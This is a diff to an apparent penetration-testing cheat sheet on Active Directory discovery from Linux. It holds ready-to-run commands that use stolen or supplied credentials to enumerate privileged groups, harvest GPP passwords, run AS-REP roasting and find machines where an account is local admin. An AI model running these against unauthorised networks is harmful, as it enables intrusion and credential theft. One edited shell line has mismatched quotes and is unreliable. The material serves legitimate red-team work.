@@ -4,7 +4,7 @@ title: TA0007 Discovery - AD Collection & Enumeration with Linux
 category: pen
 parent: cheatsheets
 modified_date: 2023-06-08
-permalink: /pen/lin/discov-ad
+permalink: /pen/discov-ad
 ---
 
 **Mitre Att&ck Entreprise**: [TA0007 - Discovery](https://attack.mitre.org/tactics/TA0007/)
@@ -95,8 +95,8 @@ SHOOT General Properties :
 Forest properties:
 ```sh
 # Enum domains and trusts: V1
-pywerview.py get-netdomaintrust -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip > pt_xxx_get-netdomaintrust.txt
-grep "trustpartner" pt_xxx_get-netdomaintrust.txt | cut -d" " -f5
+pywerview.py get-netdomaintrust -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip > $zcase"_get-netdomaintrust.txt"
+grep "trustpartner" $zcase"_get-netdomaintrust.txt" | cut -d" " -f5
 
 # Enum domains and trusts: V2
 rpcclient -U $ztarg_user_name --password $ztarg_user_pass -I $ztarg_dc_ip  
@@ -113,8 +113,8 @@ with open ("X.json","r+") as f:
 		print(t['TargetDomainName'] + "," + str(t['IsTransitive']) + "," + t['TrustDirection'] + "," + t['TrustType'])
 
 # Get the IP subnetting / IP plan
-cut -f1 -d" " trusts.txt > trusts_clean.txt
-for i in `cat trusts_clean.txt`; do ping -a $i; done
+cut -f1 -d" " trusts.txt > $zcase"_trusts_clean.txt"
+for i in `cat $zcase"_trusts_clean.txt"`; do ping -a $i; done
 ```
 
 ### <a name='shoot-dom'></a>shoot-dom
@@ -167,24 +167,31 @@ References :
 - [https://attack.mitre.org/techniques/T1134/001/](https://attack.mitre.org/techniques/T1134/001/)
 
 #### <a name='shoot-priv-users'></a>shoot-priv-users
+```sh
+# privileged group
+ztarg_group_name="Backup Operators"; ztarg_group_nick="bo"
+ztarg_group_name="DNSAdmins"; ztarg_group_nick="dns"
+ztarg_group_name="Enterprise Admins"; ztarg_group_nick="ea"
+ztarg_group_name="Group Policy Creator Owners"; ztarg_group_nick="gpco"
+ztarg_group_name="Remote Desktop Users"; ztarg_group_nick="rdp"
+ztarg_group_name="Domain Admins"; ztarg_group_nick="da"
+echo $ztarg_group_name; pywerview.py get-netgroupmember -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip -r > "$zcase""_get-netgroupmember_""$ztarg_group_nick"".txt"
 
-Privileged Users:
+# list the samaccountname
+echo $ztarg_group_name
+cat "$zcase""_get-netgroupmember_""$ztarg_group_nick"".txt" | grep membername |awk '{print $2}'
 
-- [Well-known Microsoft SID List](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab?redirectedfrom=MSDN)
-- [T1003.006](https://attack.mitre.org/techniques/T1003/006) DCSYNC
+# V1: display samaccountname with admincount = 1
+pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --admin-count > "$zcase""_get-netuser_admincount.txt"
+cat "$zcase""_get-netuser_admincount.txt" | grep samaccountname |awk '{print $2}' |sort
+cat "$zcase""_get-netuser_admincount.txt" | grep "samaccountname\|description" | cut -f2 -d":"
 
-```
-ztarg_grp="Domain Admins"
-#ztarg_grp="Enterprise Admins"
-#ztarg_grp="Backup Operators"
-#ztarg_grp="Remote Desktop Users"
-#ztarg_grp="DNSAdmins"
-
+# V2: display samaccountname with admincount = 1
+bloodhound.py -c Group --domain $zdom_fqdn -dc $zdom_dc_fqdn -u $ztarg_user_name -p $ztarg_user_pass
+cat users.json | jq -r '.data[].Properties | select((.admincount==true) and .enabled==true) | .samaccountname'
 ```
 
 #### <a name='shoot-priv-machines'></a>shoot-priv-machines
-
-Privileged Machines:
 ```sh
 tbd
 ```
@@ -195,7 +202,7 @@ tbd
 crackmapexec smb $zdom_dc_ip -u $ztarg_user_name -p $ztarg_user_pass -M gpp_pasword
 crackmapexec smb $zdom_dc_ip -u $ztarg_user_name -p $ztarg_user_pass -M gpp_autologin
 # impacket
-Get-GPPPassword.py $zz
+Get-GPPPassword.py $zz@$zdom_dc_ip
 ```
 
 #### <a name='shoot-shares'></a>shoot-shares
@@ -217,23 +224,10 @@ GetNPUsers.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -r
 #### <a name='shoot-dacl'></a>shoot-dacl
 ```sh
 # STEP 1: global gathering
-Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn 
-
-# STEP 2: check for "authenticated users" and "everyone" group
-
-# STEP 3: gather info on security groups
-#$ztarg_group="Domain Computers"
-$ztarg_group="RDP Users"
-Get-ObjectAcl -SamAccountName $ztarg_group -ResolveGUIDs -Verbose -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
-Invoke-ACLScanner -ResolveGUIDs -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn | ?{$_.IdentityReference -match $ztarg_group}
-
-# STEP 4: enumerate permissions for GPOs where users with RIDs of > -1000 have some kind of modification/control rights
-Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' -Domain $zdom_fqdn -DomainController $zdom_dc_fqdn  | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
 ```
 
 #### <a name='shoot-gpos'></a>shoot-gpos
 ```
-Get-GPPPassword
 ```
 
 ## <a name='iter'></a>iter
@@ -245,23 +239,23 @@ User groups:
 ztarg_user_next=""
 ztarg_computer=""
 date_now=$(date "+%F-%H%M")
-pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username $ztarg_user_next > pt_xxx_getnetuser_$ztarg_user_next.txt
-pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username $ztarg_user_next > pt_xxx_getnetuser_$ztarg_user_next"_"$ztarg_computer"_"$date_now.txt
+pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username $ztarg_user_next > $zcase"_getnetuser_"$ztarg_user_next".txt"
+pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username $ztarg_user_next > $zcase"_getnetuser_"$ztarg_user_next"_"$ztarg_computer"_"$date_now".txt"
 
 # Get user info + canarytoken check
 # select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount
-egrep -i  "^(cn|whenCreated|accountExpires|pwdLastSet|lastLogon|logonCount|badPasswordTime|badPwdCount)" pt_xxx_getnetuser_$ztarg_computer"_"$ztarg_user_next.txt
+egrep -i  "^(cn|whenCreated|accountExpires|pwdLastSet|lastLogon|logonCount|badPasswordTime|badPwdCount)" $zcase"_"$ztarg_computer"_"$ztarg_user_next".txt"
 
 # Get user memberof info
-pywerview.py get-netgroup -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username XXX | grep -v "^$" | cut -f2 -d" "  > pt_xxx_getnetgroup_x.txt 
+pywerview.py get-netgroup -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --username XXX | grep -v "^$" | cut -f2 -d" "  > $zcase"_getnetgroup_xxx.txt"
 
 # Get the machine's full-data
-pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --computername XXX --full-data > pt_xxx_getnetcomputer_xxx.txt
+pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --computername XXX --full-data > $zcase"_getnetcomputer_xxx.txt"
 
 # Get the machines based on an adspath / OU
 ztarg_ou = "OU=Workstations,DC=CONTOSO,DC=COM"
 ztarg_adspath = "ldap://" + $ztarg_ou
-pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -a $ztarg_adspath --dc-ip $zdom_dc_ip | grep -v "^$" | cut -f2 -d" " > pt_xxx_getnetcomputer_ou_x.txt
+pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -a $ztarg_adspath --dc-ip $zdom_dc_ip | grep -v "^$" | cut -f2 -d" " > $zcase"_getnetcomputer_ou_x.txt"
 ```
 
 ### <a name='iter-scope'></a>iter-scope
@@ -270,7 +264,7 @@ Scope of compromise:
 ```bash
 # Find where the account is local admin V1
 ./bloodhound.py -dc $zdom_dc_ip -d $zdom_fqdn -u $ztarg_user_name -p XXX -c LocalAdmin --computerfile pt_xxx_getnetcomputer_ou_x.txt
-cat 2023xxxxxxx_computers.json | jq '.data[] | select(.LocalAdmins.Collected==true)'| jq '.Properties.name' > pt_xxx_fla_pwn.txt
+cat 2023xxxxxxx_computers.json | jq '.data[] | select(.LocalAdmins.Collected==true)'| jq '.Properties.name' > $zcase"_fla_pwn.txt"
 
 # Find where the account is local admin V2
 cme winrm pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass
@@ -278,15 +272,16 @@ cme smb pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $zta
 
 # Get the DNs of the owned machines 
 # Get the DNs of the owned machines / get the cn computer (1 line) and its DN (1 line)
-while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn distinguishedName >> pt_XXX_fla_pwn_dn.txt; done < pt_XXX_fla_pwn.txt
+while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn distinguishedName >> $zcase"_fla_pwn_dn.txt"; done < $zcase"_fla_pwn.txt"
 # Get the DNs of the owned machines / format the result returned to CSV
-i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_fla_pwn_dn.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_fla_pwn_dn.csv; i=0; fi; done < pt_XXX_fla_pwn_dn.txt
+i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_fla_pwn_dn.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_fla_pwn_dn.csv; i=0; fi; done < $zcase"_fla_pwn_dn.txt"
 
 # Get the OS of the owned machines /
 # Get the OS of the owned machines / get the cn computer (1 line) and its OS (1 line)
-while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn operatingSystem >> pt_XXX_getcomputer_XXX_os.txt; done < pt_XXX_pwned_machines.txt
+while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn operatingSystem >> $zcase"_getcomputer_XXX_os.txt"; done < $zcase"_pwned_machines.txt"
+
 # Get the OS of the owned machines / format the result returned to CSV
-i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_getnetcomputer_XXX_os.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_getnetcomputer_XXX_os.csv; i=0; fi; done < pt_XXX_getcomputer_XXX_os.txt
+i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> $zcase"_getnetcomputer_XXX_os.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> $zcase"_getnetcomputer_XXX_os.csv; i=0; fi; done < $zcase"_getcomputer_XXX_os.txt"
 ```
 
 ## <a name='refresh'></a>refresh
